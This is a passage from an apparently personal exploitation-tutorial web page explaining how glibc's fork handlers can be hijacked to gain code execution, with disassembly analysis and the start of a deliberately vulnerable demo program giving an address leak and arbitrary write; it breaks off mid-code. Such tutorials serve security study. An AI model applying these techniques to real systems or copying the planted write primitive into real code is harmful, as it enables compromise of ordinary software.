<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-pwn/fork_gadget" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">fork\_gadget | My Site</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://0xa5h.com/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://0xa5h.com/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://0xa5h.com/pwn/pwn/fork_gadget"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="fork\_gadget | My Site"><meta data-rh="true" name="description" content=" "><meta data-rh="true" property="og:description" content=" "><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://0xa5h.com/pwn/pwn/fork_gadget"><link data-rh="true" rel="alternate" href="https://0xa5h.com/pwn/pwn/fork_gadget" hreflang="en"><link data-rh="true" rel="alternate" href="https://0xa5h.com/pwn/pwn/fork_gadget" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"pwn","item":"https://0xa5h.com/pwn/category/pwn"},{"@type":"ListItem","position":2,"name":"fork\\_gadget","item":"https://0xa5h.com/pwn/pwn/fork_gadget"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="My Site RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="My Site Atom Feed"><link rel="stylesheet" href="/assets/css/styles.b304860a.css">
<script src="/assets/js/runtime~main.ab778c98.js" defer="defer"></script>
<script src="/assets/js/main.aa702dda.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><link rel="preload" as="image" href="/assets/image (71).png"><link rel="preload" as="image" href="/assets/image (70).png"><link rel="preload" as="image" href="/assets/image (59).png"><link rel="preload" as="image" href="/assets/image (69).png"><link rel="preload" as="image" href="/assets/image (68).png"><link rel="preload" as="image" href="/assets/image (73).png"><link rel="preload" as="image" href="/assets/image (74).png"><link rel="preload" as="image" href="/assets/image (75).png"><link rel="preload" as="image" href="/assets/image (76).png"><link rel="preload" as="image" href="/assets/image (77).png"><link rel="preload" as="image" href="/assets/image (78).png"><link rel="preload" as="image" href="/assets/image (79).png"><link rel="preload" as="image" href="/assets/image (80).png"><link rel="preload" as="image" href="/assets/image (81).png"><link rel="preload" as="image" href="/assets/image (83).png"><link rel="preload" as="image" href="/assets/image (85).png"><link rel="preload" as="image" href="/assets/image (86).png"><link rel="preload" as="image" href="/assets/Screenshot 2024-08-25 001133.jpg"><link rel="preload" as="image" href="/assets/image (88).png"><link rel="preload" as="image" href="/assets/image (89).png"><link rel="preload" as="image" href="/assets/image (109).png"><link rel="preload" as="image" href="/assets/image (110).png"><link rel="preload" as="image" href="/assets/image (66).png"><link rel="preload" as="image" href="/assets/image (90).png"><link rel="preload" as="image" href="/assets/image (91).png"><link rel="preload" as="image" href="/assets/image (92).png"><link rel="preload" as="image" href="/assets/image (93).png"><link rel="preload" as="image" href="/assets/image (94).png"><link rel="preload" as="image" href="/assets/image (96).png"><link rel="preload" as="image" href="/assets/image (97).png"><link rel="preload" as="image" href="/assets/image (100).png"><link rel="preload" as="image" href="/assets/image (111).png"><link rel="preload" as="image" href="/assets/image (103).png"><link rel="preload" as="image" href="/assets/image (104).png"><link rel="preload" as="image" href="/assets/image (105).png"><link rel="preload" as="image" href="/assets/image (106).png"><link rel="preload" as="image" href="/assets/91d52t.jpg"><link rel="preload" as="image" href="/assets/image (107).png"><link rel="preload" as="image" href="/assets/image (108).png"><link rel="preload" as="image" href="/assets/image (112).png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">My Site</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/pwn/">Tutorial</a><a class="navbar__item navbar__link" href="/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/pwn/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/pwn/category/pwn">pwn</a><button aria-label="Collapse sidebar category &#x27;pwn&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/pwn/category/rop-234">ROP 2.34+</a><button aria-label="Expand sidebar category &#x27;ROP 2.34+&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/pwn/pwn/setcontext">setcontext</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/pwn/pwn/fork_gadget">fork\_gadget</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/pwn/category/ctf-writeups">CTF writeups</a><button aria-label="Expand sidebar category &#x27;CTF writeups&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/pwn/category/test">Test</a><button aria-label="Expand sidebar category &#x27;Test&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/pwn/category/pwn"><span>pwn</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">fork\_gadget</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>fork_gadget</h1></header>
<p>Some of you may be familiar with the exit handlers which are ran when calling <code>exit()</code>. These are typically used to clean up anything before the program is terminated, but they&#x27;re also quite useful for attackers to hijack code execution. They&#x27;re ideal, because by overwriting the <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_atexit.c#L76" target="_blank" rel="noopener noreferrer">__exit_funcs</a> array, you can specify functions to be called, along with a controlled argument. However, one downside is that, because they&#x27;re popular for attackers, they employ pointer mangling on the function pointers.</p>
<p>However there are other places where handlers like these are used, and one place I stumbled across when investigating the exit handlers, was the fork handlers, and after some investigation, I found some tricks to abuse the fork handlers to convert <code>fork</code> into a constraintless one gadget.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cheatsheet">Cheatsheet<a href="#cheatsheet" class="hash-link" aria-label="Direct link to Cheatsheet" title="Direct link to Cheatsheet">​</a></h2>
<p>Below is a cheatsheet for all the tricks covered in this post:</p>
<script src="https://gist.github.com/sasha-999/bcafec8de9a5620d8b38d78b7e9693fc.js"></script>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-are-the-fork-handlers">What are the fork handlers?<a href="#what-are-the-fork-handlers" class="hash-link" aria-label="Direct link to What are the fork handlers?" title="Direct link to What are the fork handlers?">​</a></h2>
<p><code>fork</code> has its own handlers for multiple situations:</p>
<ul>
<li><code>prepare_handler</code></li>
<li><code>parent_handler</code></li>
<li><code>child_handler</code></li>
</ul>
<p>These are stored in a single array/linked list called <code>fork_handlers</code>, which exists in a writable region of libc memory, so that more handlers can be added. In each case, all of the handlers of the corresponding type are executed in a specifc order. There are a few things that separate these from exit handlers:</p>
<ul>
<li>:white<!-- -->_check_mark: No pointer mangling.</li>
<li>❌<!-- --> No argument control.</li>
</ul>
<p>So 1 step forward, and 2 steps back. However, while we don&#x27;t get explicit argument control like with exit handlers, there are similar tricks to what we did in <a href="/pwn/pwn/rop-2.34+/ret2gets">ret2gets</a>. To see that, let&#x27;s have a closer look at <code>fork</code> across multiple versions, as the implementation of the handlers as changed, which also changes how we&#x27;d abuse them.</p>
<p><a href="/assets/files/fork_handlers-14c2b89731c080f6dc6cdbb3ba3bfffe.zip" target="_blank">Files used for the demos</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="228-235">2.28-2.35<a href="#228-235" class="hash-link" aria-label="Direct link to 2.28-2.35" title="Direct link to 2.28-2.35">​</a></h2>
<p>(The specific version used here is <code>2.35</code>)</p>
<p>Let&#x27;s first have a look at what a <code>fork_handler</code> looks like:</p>
<figure><img src="/assets/image (71).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/include/register-atfork.h#L23">fork_handler</a></p></figcaption></figure>
<ul>
<li><code>prepare_handler</code>: Handlers to prepare the process to <code>fork</code>, so they&#x27;re run <em>before</em> the <code>fork</code>.</li>
<li><code>parent_handler</code>: Handlers run as the <em>parent</em> after the <code>fork</code>.</li>
<li><code>child_handler</code>: Handlers run as the <em>child</em> after the <code>fork</code>.</li>
<li><code>dso_handle</code>: A unique id to identify which binary/shared library registered this handler.</li>
</ul>
<p>These are stored in an array called <code>fork_handlers</code>, which is defined as:</p>
<figure><img src="/assets/image (70).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/register-atfork.c#L22">fork_handlers</a></p></figcaption></figure>
<p>The way this definition works is by stating a few &quot;parameters&quot; using macros, then including <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/dynarray-skeleton.c" target="_blank" rel="noopener noreferrer">malloc/dynarray-skeleton.c</a>, which then defines a struct called <code>fork_handler_list</code>, plus a bunch of handlers for this struct.</p>
<figure><img src="/assets/image (59).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/dynarray-skeleton.c#L125">generic struct defintion</a></p></figcaption></figure>
<p>These <code>dynarray</code> structures are dynamically allocated arrays, which can resize if needed. Usually they have an initial buffer before it goes to the heap. Evaluating this yields:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">fork_handler_list</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token class-name">size_t</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token class-name">size_t</span><span class="token plain"> allocated</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">fork_handler</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> array</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">fork_handler</span><span class="token plain"> scratch</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><code>fork</code> is defined as follows:</p>
<figure><img src="/assets/image (69).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/fork.c#L40">__libc_fork</a></p></figcaption></figure>
<p>Here we call <code>__run_fork_handlers</code> with <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/include/register-atfork.h#L37" target="_blank" rel="noopener noreferrer">atfork_run_prepare</a>, indicating it wants to execute the <code>prepare</code> handlers.</p>
<figure><img src="/assets/image (68).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/register-atfork.c#L107">__run_fork_handlers</a></p></figcaption></figure>
<p>So now it will go through the array from the last element (for backwards compatibility reasons), executing each <code>prepare_handler</code> if they exist. The methods <code>fork_handler_list_size</code> and <code>fork_handler_list_at</code> are some of methods automically defined when we defined <code>fork_handler_list</code>, which just index the array and get the length (<code>used</code>) respectively. Locking may also be used, if there are multiple threads running.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="so-what">So what?<a href="#so-what" class="hash-link" aria-label="Direct link to So what?" title="Direct link to So what?">​</a></h3>
<p>At first glance, taking control of code execution doesn&#x27;t seem to be very doable, mainly due to the fact that we seemingly have no argument control. However, if we dig deeper, and look at the disassembly, we&#x27;ll notice something interesting.</p>
<figure><img src="/assets/image (73).png" alt=""><figcaption><p><code>__run_fork_handlers</code></p></figcaption></figure>
<figure><img src="/assets/image (74).png" alt=""><figcaption><p><code>__run_fork_handlers+288</code>: Locking <code>atfork_lock</code></p></figcaption></figure>
<p>First it checks the first argument <code>edi</code>, and if it&#x27;s <code>0</code>, then it means it should run the <code>prepare</code> handlers. Then checks if it should use locking, if so, jump to <code>+288</code>, where it will lock, then resume by jumping back to <code>+23</code>.</p>
<p>But then something interesting happens. <code>[fork_handlers]</code> is loaded into <code>rbp</code> (which corresponds to <code>fork_handlers-&gt;used</code>), then is loaded into <code>rdi</code>. How interesting! It then goes on to call the <code>prepare_handler</code>:</p>
<figure><img src="/assets/image (75).png" alt=""><figcaption><p><code>__run_fork_handlers+84</code>: Decrements <code>rbp</code> (the index)</p></figcaption></figure>
<figure><img src="/assets/image (76).png" alt=""><figcaption><p><code>__run_fork_handlers+48</code>: Calls the <code>prepare_handler</code></p></figcaption></figure>
<p>So theoretically, controlling the field <code>used</code> could grant us <code>rdi</code> control.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="why-does-this-happen">Why does this happen?<a href="#why-does-this-happen" class="hash-link" aria-label="Direct link to Why does this happen?" title="Direct link to Why does this happen?">​</a></h3>
<p>The reason for this is the <a href="/pwn/pwn/rop-2.34+/ret2gets#io_stdfile_0_lock-in-rdi">same reason</a> why <a href="/pwn/pwn/rop-2.34+/ret2gets">ret2gets</a> works. Let&#x27;s go back to <code>+84</code> (when the index is decremented):</p>
<figure><img src="/assets/image (77).png" alt=""><figcaption><p><code>__run_fork_handlers+84</code>: Calling <code>__libc_dynarray_at_failure</code>?</p></figcaption></figure>
<p><code>+91</code> checks the index <code>rbp</code> is within the bounds of the array (less than <code>used</code>). If it&#x27;s not, then it goes on to call <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/dynarray_at_failure.c#L23" target="_blank" rel="noopener noreferrer">__libc_dynarray_at_failure</a>, interestingly setting a second argument, but not a first? Well that&#x27;s because it already set the first argument: when <code>used</code> gets loaded. It could load <code>used</code> into any register, but chooses <code>rdi</code>, because in the case where this error happens, it doesn&#x27;t need to waste time loading it into <code>rdi</code> again, because it&#x27;s already there. </p>
<figure><img src="/assets/image (78).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/dynarray-skeleton.c#L250">fork_handler_list_at</a>: Checks the bounds, and calls the failure function with the size and index.</p></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="exploitation">Exploitation<a href="#exploitation" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation">​</a></h3>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdlib.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;unistd.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">setvbuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _IONBF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">setvbuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _IONBF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">setvbuf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stderr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _IONBF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">setup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;%p\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">fgets</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Enter address, size and data: &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;%zu %zu &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">fgets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">stdin</span><span class="token punctuation" style="color:#393A34">)</span><span 